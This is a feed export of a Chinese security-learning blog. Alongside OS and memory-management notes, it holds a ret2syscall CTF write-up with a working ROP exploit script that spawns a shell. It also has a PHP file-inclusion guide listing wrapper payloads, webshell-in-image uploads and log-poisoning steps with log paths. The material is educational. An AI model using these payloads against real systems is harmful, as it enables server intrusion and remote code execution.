crtn.o</span><br></pre></td></tr></table></figure><p>需要将上面这一大堆文件链接起来才可以得到最后的a.out可执行文件。这里的过程后面补上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day2&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day2&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day2&quot;&gt;&lt;/a&gt;程序员的自我修养 Day2&lt;/h1&gt;&lt;p&gt;上一篇文章是对操作系统和计组的一些基本概念进行了复习
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY1</title>
    <link href="http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/"/>
    <id>http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/</id>
    <published>2019-12-20T15:34:12.000Z</published>
    <updated>2019-12-24T02:38:06.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day1"><a href="#程序员的自我修养-Day1" class="headerlink" title="程序员的自我修养 Day1"></a>程序员的自我修养 Day1</h1><p>静下心来好好研究计算机底层的实现，为二进制安全的研究做好铺垫。</p><h2 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h2><p>计算机的结构是一种由上而下组成的层结构，通过中间件进行访问：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt></p><p>这其中每个层级之间的通信协议就称为 “<strong>接口</strong>“。下层是接口的提供者，上层是接口的使用者。每个中间层都是对它下层的包装和拓展。</p><p>从上图我们可以看出：</p><ul><li>应用程序和开发工具通过<strong>操作系统API</strong>（API：Application Programming Interface 应用程序编程接口）和运行库（不同的运行库提供不同的API，例如Linux下的Glibc提供POSIX的API等）进行交互；</li><li>运行库使用的是操作系统提供的<strong>系统调用接口</strong>（System Call Interface），在现实中常通过软件中断的方式提供（Linux系统用0x80号中断作为系统调用接口，而Window中通过0x2E号中断作为系统调用接口）；</li><li>操作系统内核层对于硬件接口来说是使用者，而硬件接口定义决定了操作系统内核。硬件和操作系统内核之间的接口常称为”<strong>硬件规格</strong>“（Hardware Specification）；</li></ul><p>这样我们就大致的了解了计算机不同层次之间的组织关系和联系方式。</p><h2 id="给进程分配内存"><a href="#给进程分配内存" class="headerlink" title="给进程分配内存"></a>给进程分配内存</h2><p>简单的直接分配地址策略会导致下面几个问题：（具体例子可以直接看书）</p><ul><li><p><strong>地址空间不隔离</strong>：因为所有程序都放在同一片内存空间中没有隔离，恶意程序或者BUG程序可能会很轻易地改写到其他程序的数据（Overflow的意思）</p></li><li><p><strong>内存使用效率低</strong>：因为地址空间连续，当前换出的程序的空间可能不够等待运行的程序的装入，造成空间的浪费。另一方面，程序运行中频繁的换入换出也会使得效率极低·</p></li><li><p><strong>程序运行的地址不确定</strong>：因为每次程序需要装入时，我们需要从内存中分配一段足够的空闲空间给它，而这个空闲空间的地址是不确定的。这就涉及到了重定位问题。</p></li></ul><p>既然直接分配内存明显是不行的，我们就可以引入一个中间件 “虚拟地址”，达到一种间接访问物理地址的方法。思路是这样的：使用<strong>某些映射方法来控制由虚拟地址到物理地址的映射</strong>过程。那么只要我们妥善控制了这个映射的方法，就能保证每一个程序之间的隔离效果。</p><h3 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h3><blockquote><p>首先附上汇编之前学过的知识：</p><p>十六进制0x串转为二进制 ：将每个位对应写成4位二进制形式</p></blockquote><p>贴上分段范例的示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E6%AE%B5.png" alt></p><p>上图使用的例子大概意思是： 现在有某个程序A，大小为10MB(计算：0xA00000 即是0xA个0x100000 。 其中的0x100000即是2^20个bit 即是1M。0xA个即是有10个1MB。那么就是程序A的大小为10MB)。它在虚拟地址中分配一段由0x00000000到0x00A00000的虚拟空间。 随后我们在物理地址空间里面的分配对应的相同大小的空间，假设这段空间由0x00100000到0x00B00000。<strong>虚拟空间里面的每个字节对应着物理空间里面的每个字节</strong>。那么当程序A里面访问到地址0x00001000的时候，CPU就会将这个地址转为真实的物理地址0x00101000。程序B也是同理。</p><p>假如当程序A访问虚拟地址超出了0x00A00000，就会被判断为非法访问并拒绝访问，这样就能避免程序覆盖了其他程序到导致错误。另一方面，程序不用关心它会被分配到真实物理空间的哪一区域，它只要按照自己程序的虚拟空间0x00000000到0x00A0000来编写程序和放置变量即可。</p><p>所以使用这种分段式方法基本解决了不隔离和地址不确定两个问题。我们得继续探讨如何处理效率低下的问题</p><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>首先贴出分页的范例示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E9%A1%B5.png" alt></p><p>我们首先规定一些概念：</p><ul><li>虚拟空间的页叫做”<strong>虚拟页</strong>“（Virtual Page，简称VP）</li><li>物理内存的页叫做”<strong>物理页</strong>“ （Physical Page，简称PP）</li><li>磁盘中的页叫做”<strong>磁盘页</strong>“ （Disk Page，简称DP）</li></ul><p>然后我们对上图进行分析：</p><p>进程1中的虚拟页VP0、VP1和VP7映射到了物理页PP0、PP2和PP3上面；然后进程1中有部分虚拟页位于磁盘页中，即VP2、VP3分别位于磁盘中的DP0和DP1；进程1中剩下的虚拟页VP4-VP6可能因为还没调用或者被访问到，处于未访问的状态。</p><p>VP2、VP3没有位于物理内存中，当进程需要调用到VP2和VP3的时候，硬件就会捕捉到这个消息 ：”页错误”。然后<strong>操作系统就会接管进程</strong>负责从磁盘中将VP2和VP3读入到内存中，然后再将内存中的这两个PP和虚拟页中的VP2、VP3<strong>建立映射关系</strong>。</p><p>这样分页就达成了提高效率的目的</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程的简单定义是：<strong>轻量级进程</strong>，线程是程序执行流程的最小单元。</p><p>线程具有三种基本状态：就绪 、运行 、等待</p><p>今天先写到这里吧。。。后面继续补上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day1&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day1&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day1&quot;&gt;&lt;/a&gt;程序员的自我修养 Day1&lt;/h1&gt;&lt;p&gt;静下心来好好研究计算机底层的实现，为二进制安全的研究
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2syscall</title>
    <link href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/"/>
    <id>http://bai-ren-1.github.io/2019/12/06/ret2syscall/</id>
    <published>2019-12-06T08:23:27.000Z</published>
    <updated>2019-12-07T04:31:35.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p><p>先附上有点模糊了的知识：</p><p>1、x86下 ip 调用指令的过程：</p><blockquote><p>1、从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</p><p>2、ip += 所读指令的长度，从而指向下一条指令；</p><p>3、执行指令，然后返回第一步</p></blockquote><p>2、入栈 push 操作的本质：（pop就是反过来）</p><blockquote><p>1、esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p><p>2、将数据传入这个新的栈顶单元</p></blockquote><p>3、call 和 ret 的原理</p><blockquote><p>1、call： 先push ip（当前指令的下一条指令的地址压入栈）然后 jmp near ptr 标号</p><p>2、ret ：pop ip （栈顶出栈给 ip，让ip继续执行之前指令后面的指令） </p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p><p>贴上wiki上面关于syscall的解释：</p><blockquote><p><strong>系统调用（system call）</strong>，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信</p><p><strong>用户空间（用户态）和内核空间（内核态）</strong>：操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p></blockquote><p><img src="/2019/12/06/ret2syscall/syscall.png" alt></p><p>那我们得知道一个应用程序可以如何调用系统调用，才能利用系统调用里面的系统函数（用Linux进行说明），应用程序调用系统调用的过程是：</p><blockquote><ol><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）；</li></ol></blockquote><p>同时附上操作系统实现系统调用的过程：</p><blockquote><ol><li>应用程序调用库函数（API）；</li><li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li><li>中断处理函数返回到 API 中；</li><li>API 将 EAX 返回给应用程序。</li></ol></blockquote><p>现在知道了通过 int 80h 我们就能在程序中调用系统调用，这里附上 Linux 系统调用表：</p><table><thead><tr><th>%eax</th><th>系统调用名</th><th>源代码</th><th>%ebx</th><th>%ecx</th><th>%edx</th><th>%esx</th><th>通过堆栈</th></tr></thead><tbody><tr><td>1</td><td>sys_exit</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>sys_fork</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>sys_read</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>4</td><td>sys_write</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>5</td><td>sys_open</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>6</td><td>sys_close</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>sys_waitpid</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>pid_t</td><td>unsigned int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>8</td><td>sys_creat</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>sys_link</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>sys_unlink</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>sys_execve</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>sys_chdir</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>sys_time</td><td><a href="file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>sys_mknod</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#dev_t" target="_blank" rel="noopener">dev_t</a></td><td>-</td><td>-</td></tr><tr><td>15</td><td>sys_chmod</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#mode_t" target="_blank" rel="noopener">mode_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>sys_lchown</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>18</td><td>sys_stat</td><td><a href="file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>19</td><td>sys_lseek</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#off_t" target="_blank" rel="noopener">off_t</a></td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>20</td><td>sys_getpid</td><td><a href="file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用 ctf-wiki 上面的 ret2syscall（在我本地的文件名为 pwn） ，基本信息就直接说了。下面是 main 的代码，还是 gets 栈溢出然后控制程序执行。通过 cyclic 可以得到栈溢出到返回地址的偏移地址是112；然后程序是32位，开启了NX保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在原程序里面是找不到系统命令直接可以 ret 的，于是我们得使用到syscall。</p><p>在这里我们决定构成下面这个系统调用： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">'/bin/sh'</span>);</span><br></pre></td></tr></table></figure><p>对照表，我们能看到要控制的寄存器是 eax 和ebx  ，那么就可以开始操作了。</p><p>首先我们用 ROPgadget 看一下我们能是用到的 gadgets，首先看 eax , 命令如图所示：</p><p><img src="/2019/12/06/ret2syscall/ret2syscall-1.png" alt></p><p>里面第二个地址的 gadget 干脆利落只控制 eax，直接存起来。我们还得继续寻找 ebx 和  int 0x80 和 /bin/sh 的 rop 链。</p><p>然后我们继续寻找 ebx :</p><p><img src="/2019/12/06/ret2syscall/syscall-2.png" alt></p><p>可以迅速观察到里面的 0x0806eb90 这个地址直接操作了 ebx 、ecx 和 edx ，完美的选择，存下来。</p><p>那么剩下来的就只有找到字符串  /bin/sh 和 int 0x80 的位置了：</p><p><img src="/2019/12/06/ret2syscall/syscall-3.png" alt></p><p>找到 /bin/sh 的位置，继续找 int 0x80 ：</p><p><img src="/2019/12/06/ret2syscall/syscall-4.png" alt></p><p>要素都集齐了，下面开始了 rop 之旅，附上自己的 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>下面用详细大白话解释exp：</p><blockquote><p>112个 a 控制溢出到返回地址，我们设置返回地址为 pop_eax 操作的地址。当 ip 运行到这个地址返回时，就会跳去执行 pop eax 的操作了；同时 esp 在读完这个返回地址后继续往下，指向 0xb 这个数据单元。在 ip 读完 pop eax 指令，就会把当前栈顶的值赋值给 eax，也就是把 0xb 赋值给 eax ，那么我们的第一步目的就达成了。</p><p>然后在栈弹给值 0xb 给 eax 后，栈指针继续往下走指向了 ebx 那一串 pop 指令所在地址，同时ip 会继续走到了执行 ret 的那条指令的位置（ pop eax 后的 ret 操作）。 ret 本质（模糊知识点起作用了）就是把当前栈指向的地址（也就是 ebx 的那一串 pop 指令的地址）返回给 ip 。然后 ip 就会傻傻的跑去执行那一串 pop 操作了，esp也傻傻的继续往下走（指向了payload中的第一个0） 。</p><p>那一串 pop 操作顺序是 pop edx；pop ecx；pop ebx；ret  ，一步一步对应就会是 ：弹出栈顶给 edx（edx被赋值为0）-&gt;  esp继续走（esp指向了第二个0）然后 ip 也继续走去执行 pop ecx  -&gt;  弹出栈顶给 ecx（ecx被赋值为0），然后 ip 也继续走去执行 pop ebx  -&gt; esp继续走 -&gt; 弹出栈顶给 ebx （ ebx 被赋值了 /bin/sh） -&gt; esp继续往下走（指向了 int 0x80）-&gt; ret（弹出栈顶 int 0x80 的值给 ip ，ip跑去执行 int 0x 80h 进入中断）。</p></blockquote><p>至此 rop 链构建成功，成功getshell。</p><p><img src="/2019/12/06/ret2syscall/shell.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用好用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h1&gt;&lt;p&gt;大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2019-11-30T12:49:42.000Z</published>
    <updated>2019-12-05T12:02:23.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里就不多说了</p><p> PHP的<strong>文件包含</strong>可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可 ，一般来说php使用的文件包含函数有四个：include、include_once、require、require_once</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>类型的包含文件时即使遇到错误，下面代码会依然执行</span><br><span class="line"><span class="keyword">include</span>()：</span><br><span class="line"><span class="keyword">include_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br><span class="line">    </span><br><span class="line"><span class="keyword">require</span>类型的包含文件时遇到错误直接退出</span><br><span class="line"><span class="keyword">require</span>()：</span><br><span class="line"><span class="keyword">require_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br></pre></td></tr></table></figure><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul><li><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p><blockquote><p>allow_url_include = On;</p><p>allow_url_fopen 无要求;</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p><blockquote><p>无要求；</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><blockquote><p>php版本 &gt;= 5.3.0</p></blockquote></li></ul><p>  范例：</p><p>  场景一：文件限定支持上传 zip 等压缩包格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写<code>&lt;?php phpinfo(); ?&gt;</code> 的读取 phpinfo 的 txt (这里也可以直接写一句话木马 shabi.php )。然后添加到压缩包 test.zip 里面并且成功上传，然后通过 phar 就能读出压缩包里面的txt文件并且使其能被执行：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.zip/phpinfo.txt</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure><p>  场景二：文件限定支持上传 jpg 等图片格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写一句话木马 shabi.php ，然后添加到压缩包 test.zip 里面，并且将 test.zip 改名为 test.jpg ，这样就能成功上传并且能通过 phar 读出压缩包里面的一句话木马并且执行：‘</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.jpg/shabi.php</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.jpg/shabi.php</span></span><br></pre></td></tr></table></figure><hr><ul><li><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件</p><blockquote><p>php版本 &gt;= 5.3.0</p><p>需要指定绝对路径</p><p>构造压缩包的方法等同于phar</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//E:/phpStudy/WWW/test.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的 %23 是 # 的url编码</p></blockquote></li></ul><hr><ul><li><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>利用条件</p><blockquote><p>php版本大于等于php5.2</p><p>allow_url_fopen = On</p><p>allow_url_include = On</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">接收文本执行命令：</span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">接收base64编码文件执行命令:</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="number">2</span>b </span><br><span class="line"></span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure><blockquote><p>%2b 是 + 的url编码，解码后PD9waHAgcGhwaW5mbygpOz8+这串base64串解码后是</p><p> <code>&lt;?php phpinfo();  ?&gt;</code></p><p>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== 这串base64串解码后是</p><p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p></blockquote></li></ul><hr><h2 id="日志包含getshell"><a href="#日志包含getshell" class="headerlink" title="日志包含getshell"></a>日志包含getshell</h2><p>当存在文件包含漏洞的时候，我们往往可以通过污染日志并且包含来getshell。</p><p>污染日志的原理就是通过访问一个错误的请求让日志记录下这条记录，我们在访问错误记录时使用代码进行请求，然后再通过文件包含包含出来，就能达到执行的目的了：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E4%BE%8B%E5%AD%90.png" alt></p><p>标上红标的地方改为一句话木马，然后包含出来就能getshell了。</p><blockquote><p>因为浏览器的编码问题，污染日志的一句话可能被自动加上url编码导致包含时会失效。</p><p>解决方法：1、用bp改回参数；2、用curl命令发请求</p></blockquote><p>附上各种能污染的WEB日志的路径：</p><h3 id="Apache日志："><a href="#Apache日志：" class="headerlink" title="Apache日志："></a>Apache日志：</h3><p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，error.log的默认路径是在在</p><ul><li>/var/log/apache2/error.log</li></ul><p>下面是其他一般日志的路径</p><ul><li>/var/log/apache/access_log</li><li>/var/www/logs/access_log</li><li>/var/log/access_log</li><li>/var/log/apache2/access.log </li></ul><hr><h3 id="SSH日志："><a href="#SSH日志：" class="headerlink" title="SSH日志："></a>SSH日志：</h3><p>需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">'&lt;?php phpinfo(); 